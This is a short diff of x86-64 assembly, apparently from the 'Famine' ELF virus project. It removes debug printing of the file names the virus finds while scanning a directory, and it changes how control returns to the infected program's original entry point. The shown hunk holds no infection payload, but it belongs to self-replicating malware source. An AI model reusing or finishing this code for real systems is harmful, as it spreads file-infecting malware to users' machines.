@@ -81,20 +81,20 @@ _read_data:
 	mov r12b, BYTE [rsi + 18] ; at offset  
 	cmp r12, 8
 	jne _continue
-	mov rdi, 1 ; write(1, ..., ...) ;
+;	mov rdi, 1 ; write(1, ..., ...) ;
 	add rsi, 19 ; in the dirent struct, the name of te file is at offset 19
-	xor rdx, rdx
+;	xor rdx, rdx
 
 ; counting string len
-_count_str_size:
-	cmp BYTE [rsi + rdx], 0
-	je _continue_print
-	inc rdx
-	jmp _count_str_size
+;_count_str_size:
+;	cmp BYTE [rsi + rdx], 0
+;	je _continue_print
+;	inc rdx
+;	jmp _count_str_size
 
-_continue_print:
-	mov rax, 1 ; write syscall number
-	syscall
+;_continue_print:
+;	mov rax, 1 ; write syscall number
+;	syscall
 	mov rdi, rsi
 	mov rsi, QWORD [rsp + 280]
 	call _treat_file
@@ -120,4 +120,5 @@ _end_famine:
 	ret
 
 _jmp_to_o_entry:
-	jmp [_o_entry]
+	leave
+	jmp [r10]
